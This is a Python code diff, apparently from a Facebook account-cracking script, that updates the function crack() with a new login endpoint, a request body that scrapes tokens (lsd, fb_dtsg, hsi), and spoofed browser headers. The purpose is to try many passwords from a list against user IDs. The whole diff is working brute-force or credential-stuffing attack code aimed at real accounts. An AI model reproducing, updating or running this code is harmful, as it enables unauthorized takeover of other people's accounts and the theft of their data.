@@ -170,19 +170,50 @@ def crack(uid, password_list, total_count):
             "user-agent": us,
             "viewport-width": "980"}
             requu1 = Session.get(url1,headers=head)
-            log_data = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(requu1.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(requu1.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': uid, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': '0', 'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw), 'bi_wvdp': '', 'fb_dtsg': '', 'jazoest': re.search('name="jazoest" value="(.*?)"',str(requu1.text)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1), '__dyn': '', '__csr': '', '__req': random.choice(["1","2","3","4","5","6","7","8","9","0"]), '__fmt': '0', '__a': '',  '__user': '0'}
-            url = "https://limited.facebook.com/login/device-based/login/async/?api_key=621206481228053&auth_token=8d53cc386ba64ee27ab19e8c022079fb&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fauth_type%3Drerequest%26client_id%3D621206481228053%26scope%3Duser_birthday%252Cuser_gender%252Cuser_age_range%252Cemail%26state%3DcsrfToken%252Coa7Nnqent9xM0zudcGzG%257CresumePath%252C%252Fas%252FHhVtgWhxp5%252Fresume%252Fas%252Fauthorization.ping%26redirect_uri%3Dhttps%253A%252F%252Feu.idp.adidas.com%252Fext%252Ffacebook-authn%252F%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De2c75b2d-cd0f-46d4-80c7-bb7e62158972%26tp%3Dunspecified%26cbt%3D1765733602723&refsrc=deprecated&app_id=621206481228053&cancel=https%3A%2F%2Feu.idp.adidas.com%2Fext%2Ffacebook-authn%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DcsrfToken%252Coa7Nnqent9xM0zudcGzG%257CresumePath%252C%252Fas%252FHhVtgWhxp5%252Fresume%252Fas%252Fauthorization.ping%23_%3D_&lwv=100"
-            headers = {
-            'sec-ch-ua-platform': '"Android"',
-            'Referer': 'https://limited.facebook.com/login.php?skip_api_login=1&api_key=621206481228053&kid_directed_site=0&app_id=621206481228053&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fauth_type%3Drerequest%26client_id%3D621206481228053%26scope%3Duser_birthday%252Cuser_gender%252Cuser_age_range%252Cemail%26state%3DcsrfToken%252Coa7Nnqent9xM0zudcGzG%257CresumePath%252C%252Fas%252FHhVtgWhxp5%252Fresume%252Fas%252Fauthorization.ping%26redirect_uri%3Dhttps%253A%252F%252Feu.idp.adidas.com%252Fext%252Ffacebook-authn%252F%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De2c75b2d-cd0f-46d4-80c7-bb7e62158972%26tp%3Dunspecified&cancel_url=https%3A%2F%2Feu.idp.adidas.com%2Fext%2Ffacebook-authn%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DcsrfToken%252Coa7Nnqent9xM0zudcGzG%257CresumePath%252C%252Fas%252FHhVtgWhxp5%252Fresume%252Fas%252Fauthorization.ping%23_%3D_&display=page&locale=bn_IN&pl_dbl=0',
-            'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
-            'X-Response-Format': 'JSONStream',
-            'sec-ch-ua-mobile': '?1',
-            'X-ASBD-ID': '359341',
-            'X-FB-LSD': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1),
-            'X-Requested-With': 'XMLHttpRequest',
-            'User-Agent': us,
-            'Content-Type': 'application/x-www-form-urlencoded',}           
+            log_data = {
+            "__aaid": "0",
+            "__user": "0",
+            "__a": "1",
+            "__req": str(random.randint(1,9)),
+            "__hs": re.search('"haste_session":"(.*?)"',str(requu1.text)).group(1),
+            "dpr": "2",
+            "__ccg": "EXCELLENT",
+            "__rev": "1026809190",
+            "__s": "7vxgmt:fqn81j:797xam",
+            "__hsi": re.search('"hsi":"(\d+)"',str(requu1.text)).group(1),
+            "__dyn": "0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x60lW4o0wW1gCwjE0AC09Mx60se2G0pS0ny0oi0zE5W0Y81soG0xo2ewbS1LwpEcE1kU1bo8Xw8S0QU3yw",
+            "fb_dtsg": re.search('"dtsg":{"token":"(.*?)"',str(requu1.text)).group(1),
+            "jazoest": "25247",
+            "lsd": re.search('"lsd":"(.*?)"',str(requu1.text)).group(1),
+            "params": "{\"params\":\"{\\\"server_params\\\":{\\\"credential_type\\\":\\\"password\\\",\\\"username_text_input_id\\\":\\\"8v2bez:61\\\",\\\"password_text_input_id\\\":\\\"8v2bez:62\\\",\\\"login_source\\\":\\\"Login\\\",\\\"login_credential_type\\\":\\\"none\\\",\\\"server_login_source\\\":\\\"login\\\",\\\"ar_event_source\\\":\\\"login_home_page\\\",\\\"should_trigger_override_login_success_action\\\":0,\\\"should_trigger_override_login_2fa_action\\\":0,\\\"is_caa_perf_enabled\\\":0,\\\"reg_flow_source\\\":\\\"login_home_native_integration_point\\\",\\\"caller\\\":\\\"gslr\\\",\\\"is_from_landing_page\\\":0,\\\"is_from_empty_password\\\":0,\\\"is_from_aymh\\\":0,\\\"is_from_password_entry_page\\\":0,\\\"is_from_assistive_id\\\":0,\\\"is_from_msplit_fallback\\\":0,\\\"two_step_login_type\\\":\\\"one_step_login\\\",\\\"is_vanilla_password_page_empty_password\\\":0,\\\"INTERNAL__latency_qpl_marker_id\\\":36707139,\\\"INTERNAL__latency_qpl_instance_id\\\":\\\"53590561100440\\\",\\\"device_id\\\":null,\\\"family_device_id\\\":null,\\\"waterfall_id\\\":\\\""+str(uuid.uuid4)+"\\\",\\\"offline_experiment_group\\\":null,\\\"layered_homepage_experiment_group\\\":null,\\\"is_platform_login\\\":0,\\\"is_from_logged_in_switcher\\\":0,\\\"is_from_logged_out\\\":0,\\\"access_flow_version\\\":\\\"pre_mt_behavior\\\"},\\\"client_input_params\\\":{\\\"machine_id\\\":\\\"\\\",\\\"cloud_trust_token\\\":null,\\\"block_store_machine_id\\\":\\\"\\\",\\\"zero_balance_state\\\":\\\"\\\",\\\"contact_point\\\":\\\""+uid+"\\\",\\\"password\\\":\\\""+"#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw)+"\\\",\\\"accounts_list\\\":[],\\\"fb_ig_device_id\\\":[],\\\"secure_family_device_id\\\":\\\"\\\",\\\"encrypted_msisdn\\\":\\\"\\\",\\\"headers_infra_flow_id\\\":\\\"\\\",\\\"try_num\\\":1,\\\"login_attempt_count\\\":1,\\\"event_flow\\\":\\\"login_manual\\\",\\\"event_step\\\":\\\"home_page\\\",\\\"openid_tokens\\\":{},\\\"auth_secure_device_id\\\":\\\"\\\",\\\"client_known_key_hash\\\":\\\"\\\",\\\"has_whatsapp_installed\\\":0,\\\"sso_token_map_json_string\\\":\\\"\\\",\\\"should_show_nested_nta_from_aymh\\\":0,\\\"password_contains_non_ascii\\\":\\\"false\\\",\\\"has_granted_read_contacts_permissions\\\":0,\\\"has_granted_read_phone_permissions\\\":0,\\\"app_manager_id\\\":\\\"\\\",\\\"aymh_accounts\\\":[{\\\"id\\\":\\\"\\\",\\\"profiles\\\":{\\\"id\\\":{\\\"user_id\\\":\\\"\\\",\\\"name\\\":\\\"\\\",\\\"profile_picture_url\\\":\\\"\\\",\\\"small_profile_picture_url\\\":null,\\\"notification_count\\\":0,\\\"credential_type\\\":\\\"none\\\",\\\"token\\\":\\\"\\\",\\\"last_access_time\\\":0,\\\"is_derived\\\":0,\\\"username\\\":\\\"\\\",\\\"password\\\":\\\"\\\",\\\"has_smartlock\\\":0,\\\"account_center_id\\\":\\\"\\\",\\\"account_source\\\":\\\"\\\",\\\"credentials\\\":[],\\\"nta_eligibility_reason\\\":null,\\\"from_accurate_privacy_result\\\":0,\\\"dbln_validated\\\":0}}}],\\\"lois_settings\\\":{\\\"lois_token\\\":\\\"\\\"}}}\"}"
+            }
+            url = "https://p.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.bloks.caa.login.async.send_login_request&type=action&__bkv=702c2f684e5cb91415ff73ea04c6b82d5580487fbd0a90975765b0adee500940"
+            headers = {"authority": "p.facebook.com",
+            "method": "POST",
+            "path": "/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios&lwv=100",
+            "scheme": "https",
+            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+            "accept-encoding": "gzip, deflate, br",
+            "accept-language": "en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
+            "cache-control": "max-age=0",
+            "content-type": "application/x-www-form-urlencoded",
+            "dpr": "3",
+            "origin": "https://p.facebook.com",
+            "referer": "https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM1MTM2NjI2LCJjYWxsc2l0ZV9pZCI6MjM5NDQ2MTI0MDg0ODgxN30%3D&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios",
+            "sec-ch-prefers-color-scheme": "light",
+            "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
+            "sec-ch-ua-full-version-list": "\"Not-A.Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"124.0.6327.4\"",
+            "sec-ch-ua-mobile": "?0",
+            "sec-ch-ua-model": "\"\"",
+            "sec-ch-ua-platform": "\"Linux\"",
+            "sec-ch-ua-platform-version": "\"\"",
+            "sec-fetch-dest": "document",
+            "sec-fetch-mode": "navigate",
+           "sec-fetch-site": "same-origin",
+           "sec-fetch-user": "?1",
+           "upgrade-insecure-requests": "1",
+           "user-agent": us,
+           "viewport-width": "980"}         
             respon = Session.post(url,data=log_data,headers=headers,allow_redirects=False)
             log_cookies = Session.cookies.get_dict().keys()
             # Check response
